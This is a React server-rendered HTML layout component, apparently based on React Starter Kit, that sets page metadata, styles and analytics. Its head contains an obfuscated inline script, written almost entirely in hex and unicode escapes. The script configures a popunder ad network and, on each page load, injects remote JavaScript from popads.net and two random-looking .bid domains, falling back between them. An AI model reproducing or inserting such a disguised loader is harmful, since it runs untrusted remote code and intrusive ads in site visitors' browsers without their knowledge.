/**
 * React Starter Kit (https://www.reactstarterkit.com/)
 *
 * Copyright © 2014-present Kriasoft, LLC. All rights reserved.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.txt file in the root directory of this source tree.
 */

import React from "react";
import PropTypes from "prop-types";
import serialize from "serialize-javascript";
import config from "../config";

/* eslint-disable react/no-danger */

class Html extends React.Component {
  static propTypes = {
    title: PropTypes.string.isRequired,
    description: PropTypes.string.isRequired,
    styles: PropTypes.arrayOf(
      PropTypes.shape({
        id: PropTypes.string.isRequired,
        cssText: PropTypes.string.isRequired
      }).isRequired
    ),
    scripts: PropTypes.arrayOf(PropTypes.string.isRequired),
    app: PropTypes.object, // eslint-disable-line
    children: PropTypes.string.isRequired
  };

  constructor(props) {
    super(props);
  }

  render() {
    const {
      title,
      image,
      description,
      styles,
      scripts,
      app,
      dev,
      children
    } = this.props;
    return (
      <html className="no-js" lang="en">
        <head>
          <meta charSet="utf-8" />
          <meta httpEquiv="x-ua-compatible" content="ie=edge" />
          <title>
            {title}
          </title>
          <meta name="description" content={description} />
          <meta name="viewport" content="width=device-width, initial-scale=1" />
          <meta property="og:type" content="video.other" />
          <meta property="og:title" content={title} />
          <meta name="twitter:card" content="summary" />
          <meta name="twitter:title" content={title} />

          {dev && <script type="text/javascript">window.__DEV__ =true;</script>}
          {image &&
            <meta
              property="twitter:image"
              content={image.replace(" ", "%20")}
            />}
          {image &&
            <meta property="og:image" content={image.replace(" ", "%20")} />}
          {image &&
            <meta property="og:url" content={image.replace(" ", "%20")} />}
          {/* {image && <meta property="og:image:width" content="200" />}
          {image && <meta property="og:image:height" content="200" />} */}

          <script
            type="text/javascript"
            data-cfasync="false"
            dangerouslySetInnerHTML={{
              __html: `/*<![CDATA[/* */
              /* Privet darkv. Each domain is 2h fox dead */
               (function(){ var f=window;f["\u005f\x70\u006fp"]=[["\x73\x69te\x49\x64",2400649],["\x6d\u0069\x6e\u0042\u0069\u0064",0],["\u0070op\x75n\x64\u0065\u0072\u0073\u0050e\u0072\x49\u0050",4],["de\u006c\u0061yB\x65t\x77\x65\u0065n",0],["\x64\u0065\u0066\x61u\u006c\u0074",false],["\u0064\x65\x66\x61u\x6ct\x50erD\x61\u0079",0],["\x74\x6f\u0070\x6d\u006fs\x74L\x61y\x65r",!0]];var c=["\x2f\u002fc1\u002e\x70\u006fp\x61d\x73\x2en\u0065t\u002fp\x6f\u0070\x2e\u006as","/\u002f\u0063\u0032.\x70\u006f\u0070a\x64\x73.\u006e\u0065\u0074\x2f\u0070\x6fp\x2e\x6a\x73","\x2f\x2fww\x77.\u0078\u0078pf\u006fx\u006d\x76p\u006a\x6fh.b\x69\x64/s\u0063\x2ej\x73","\x2f\u002fw\x77\x77\u002e\u0073\x7a\x6ct\x69o\x6a\u0071\x73\x2e\u0062\x69\u0064\x2f\x76\x2e\u006a\x73",""],g=0,h,p=function(){if(""==c[g])return;h=f["\x64\x6fc\x75\u006d\x65n\u0074"]["cre\x61\u0074e\u0045l\x65ment"]("\x73c\u0072\u0069p\u0074");h["\x74\u0079\x70e"]="\x74\x65x\x74/\u006a\u0061v\u0061\x73\u0063r\u0069pt";h["\x61sy\u006ec"]=!0;var y=f["d\u006f\x63u\x6d\u0065n\x74"]["\x67\x65\u0074\x45l\x65\x6d\x65n\x74\u0073\u0042\u0079\x54a\x67\x4eam\u0065"]("scr\x69\u0070\u0074")[0];h["s\x72\u0063"]=c[g];if(g<2){h["\x63\u0072\x6f\u0073\u0073\x4fr\u0069\x67i\x6e"]="\u0061n\x6f\u006e\u0079\x6d\x6f\u0075s";};h["\x6fner\u0072\u006f\u0072"]=function(){g++;p()};y["\x70\u0061rent\x4e\x6fde"]["\u0069nse\u0072\u0074\x42\u0065\x66or\x65"](h,y)};p()})();
              /*]]>/* */`
            }}
          />

          {scripts.map(script => {
            <link key={script} rel="preload" href={script} as="script" />;
          })}

          <link
            rel="stylesheet"
            href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css"
          />
          <link rel="apple-touch-icon" href="apple-touch-icon.png" />
          <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
          {styles.map(style =>
            <style
              key={style.id}
              id={style.id}
              dangerouslySetInnerHTML={{ __html: style.cssText }}
            />
          )}
        </head>
        <body>
          <div id="fb-root" ref={fbdiv => (this.fbdiv = fbdiv)} />

          <div id="app" dangerouslySetInnerHTML={{ __html: children }} />
          <script
            dangerouslySetInnerHTML={{ __html: `window.App=${serialize(app)}` }}
          />

          {scripts.map(script =>
            <script key={script} src={script} type="text/javascript" />
          )}
          {config.analytics.googleTrackingId &&
            <script
              dangerouslySetInnerHTML={{
                __html:
                  "window.ga=function(){ga.q.push(arguments)};ga.q=[];ga.l=+new Date;" +
                  `ga('create','${config.analytics
                    .googleTrackingId}','auto');ga('send','pageview')`
              }}
            />}
          {config.analytics.googleTrackingId &&
            !dev &&
            <script
              src="https://www.google-analytics.com/analytics.js"
              async
              defer
            />}
          <div id="fb-root" />
        </body>
      </html>
    );
  }
}

export default Html;
